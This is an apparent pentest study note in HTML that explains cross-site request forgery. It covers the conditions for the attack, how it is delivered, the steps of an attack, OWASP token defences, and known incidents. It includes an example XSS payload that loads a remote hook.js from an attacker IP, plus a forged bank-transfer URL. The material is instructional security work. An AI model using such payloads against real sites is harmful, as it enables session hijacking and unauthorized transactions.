<!doctype html>
<html>

<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Cross-Site Request Forgery (CSRF/XSRF)</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
</head>

<body>
  <div class='page'>
    <h1 class='title'>Cross-Site Request Forgery (CSRF/XSRF)</h1><br /><strong>
      <h3>Cross-Site Request Forgery (CSRF/XSRF)</h3>
    </strong><br />CSRF <span style="text-decoration:underline;">is often pronounced &quot;Sea-Surf&quot;</span> and is
    <span style="text-decoration:underline;">sometimes is called XSRF</span><br /><br />• <strong>OWASP Testing for CSRF
      (OTG-SESS-005):</strong> <a
      href="https://wiki.owasp.org/index.php/Testing_for_CSRF_(OTG-SESS-005)" target="_blank">https://wiki.owasp.org/index.php/Testing_for_CSRF_(OTG-SESS-005)</a><br />CSRF
    is an attack that forces an end user to execute unwanted actions on a web application in which he/she is currently
    authenticated.<br />With a little help of social engineering (like sending a link via email or chat), an attacker
    may force the users of a web application to execute actions of the attacker&#39;s choosing. <br />A successful CSRF
    exploit can compromise end user data and operation, when it targets a normal user. If the targeted end user is the
    administrator account, a CSRF attack can compromise the entire web application<br /><br /><br />• <strong>OWASP CSRF
      Prevention Cheat Sheet:</strong><br /> <a
      href="https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html" target="_blank">https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html</a><br />
    <br /><br /><strong>Difference Between XSS and CSRF</strong><br />• <span
      style="text-decoration:underline;">Similarity:</span> <br /> ◇ Both Cross-Site Scripting (XSS) and Cross-Site
    Request Forgery (CSRF) involve the victim submitting a web request originally crafted by the attacker.<br />• <span
      style="text-decoration:underline;">Difference:</span><br /> ◇ While XSS uses uses a scripting language (most
    commonly JavaScript), CSRF uses a static content to exploit a victim<br /> <span style="color:#a5452a;">example
      XSS:</span>
    <code>http://mutillidae/index.php?page=</code><code><span style="color:#e20000;">&lt;script src=http://192.168.1.139:3000/hook.js&gt;&lt;/script&gt;</span></code><br />
    <span style="color:#a5452a;">example CSRF:</span>
    <code>http://bank.example.com/transfer.php?</code><code><span style="color:#e20000;">acct=1337&amp;amount=1000</span></code><br /><br /><strong>Conditions
      required for CSRF</strong><br /> ◇ The application <span style="text-decoration:underline;">uses only a session
      cookie to identify which user issued the request</span>. There are no other tokens or mechanisms in place to track
    user sessions.<br /> ◇ Action of interest for an attacker<br /> ◇ An attacker can easily determine the values of the
    request parameters that are needed to perform the action<br /><br /><strong>How to deliver a CSRF
      exploit</strong><br />We have two ways to deliver a CSRF exploit:<br />• Place the malicious HTML onto a web site
    that they control, and then induce victims to visit that web site.<br /> <span
      style="color:#a5452a;">example:</span> like we have seen with <a
      href="-WebApp_Pentest--Exploitation--Client-Side--Cross-Site_Request_Forgery_(CSRF-XSRF)--How_to_construct_a_CSRF_attack--ZAP_generate_CSRF_Poc.html">ZAP
      tool</a> and <a
      href="p_Pentest--Exploitation--Client-Side--Cross-Site_Request_Forgery_(CSRF-XSRF)--How_to_construct_a_CSRF_attack--BurpSuite_Generate_CSRF_PoC.html">Burp
      tool</a> <br />• employ a GET method with fully self-contained single URL on the vulnerable web site. <br /> ◇ In
    this situation, the attacker not need to employ an external site, and can directly feed victims a malicious URL on
    the vulnerable domain.<br /> <span style="color:#a5452a;">example:</span>
    <code>http://bank.example.com/transfer.php?</code><code><span style="color:#e20000;">acct=1337&amp;amount=1000</span></code><br /><br /><strong>How
      Find and Execute a CSRF attack</strong><br />1. Attacker performs vulnerability research on a site and/or
    application to find a CSRF flaw. Usually first is helpful register an account on the website.<br /> When we do a
    transaction we need to observe it (via an interception proxy such as Burp or ZAP), carefully checking for any
    security mechanisms. <br /> There is a flaw if a transaction that does not require a dynamic element (such as a
    secure random transaction token) and/or using weak anti-CSRF protection (such as checking the referer).<br /> <span
      style="color:#a5452a;">example CSRF:</span>
    <code>http://bank.example.com/transfer.php?</code><code><span style="color:#e20000;">acct=1337&amp;amount=1000</span></code><br />2.
    Attacker emails the CSRF link to the victim<br />3. The Victim user clicks on an email link (in this example) and
    the link will render in their browser and the transaction executed after he login the website.<br /><span
      style="text-decoration:underline;">Why does the transaction work?</span><br /> ◇ The victim is logged in to the
    bank in their browser (and has cookies, etc., proving so)<br /> ◇ The transfer transaction comes from the
    victim&#39;s authorized browser<br /> ◇ The Same-Origin Policy of the transfer matches the original bank login and
    subsequent cookies, etc.<br /> ◇ Same protocol, name, and port as the subsequent transfer request<br /> ◇ The bank
    site does not know the link originated from another source (email, in this case)<br /> ▪ To prevent CSRF attacks
    bank site must know the transaction originated somewhere else (hence the word &quot;cross&quot; in Cross-Site
    Scripting). <br /> How to do this? In addition to strict enforcement of the Same-Origin Policy, OWASP suggests <a
      href="https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html#synchronizer-token-pattern" target="_blank">Synchronizer
      (CSRF) Tokens</a><br /><br /><br /><strong><span style="color:#a5452a;">Example of famous CSRF
        attacks</span></strong><br />• <a
      href="http://thehackernews.com/2014/08/flickr-cross-site-request-forgery.html" target="_blank">http://thehackernews.com/2014/08/flickr-cross-site-request-forgery.html</a><br />•
    <a
      href="http://web.archive.org/web/20150418174949/http:/breakingbits.net/2015/01/18/taking-over-godaddy-accounts-using-csrf/" target="_blank">http://web.archive.org/web/20150418174949/http:/breakingbits.net/2015/01/18/taking-over-godaddy-accounts-using-csrf/</a><br />•
    <a
      href="https://prakharprasad.com/blog/twitter-translation-center-csrf/" target="_blank">https://prakharprasad.com/blog/twitter-translation-center-csrf/</a><br /><br /><br /><strong>
      <h3>Bibliography:</h3>
    </strong><br />• <a href="https://portswigger.net/web-security/csrf" target="_blank">https://portswigger.net/web-security/csrf</a>
  </div>
</body>

</html>